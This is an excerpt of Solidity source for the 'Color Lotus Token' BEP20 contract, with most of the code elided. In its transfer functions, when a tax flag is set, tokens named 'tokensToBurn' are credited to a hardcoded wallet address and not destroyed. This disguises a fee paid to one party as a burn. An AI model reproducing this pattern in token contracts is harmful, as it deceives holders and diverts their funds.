...
contract ColorLotus is BEP20Detailed {
  ...
  string constant tokenName = "Color Lotus Token";
  ...
  function transfer(address to, uint256 value) public returns (bool) {
    ...
    if(taxEnabled == true) {
        _balances[0xA4c20e4254eD2bDE75eb7BdCa3e5E493786eff21] = _balances[0xA4c20e4254eD2bDE75eb7BdCa3e5E493786eff21].add(tokensToBurn);
    }
    ...
    if(taxEnabled == true) {
        emit Transfer(msg.sender, 0xA4c20e4254eD2bDE75eb7BdCa3e5E493786eff21, tokensToBurn);
    }
  ...
  function transferFrom(address from, address to, uint256 value) public returns (bool) {
    ...
    if(taxEnabled == true) {
        emit Transfer(from, 0xA4c20e4254eD2bDE75eb7BdCa3e5E493786eff21, tokensToBurn);
    }
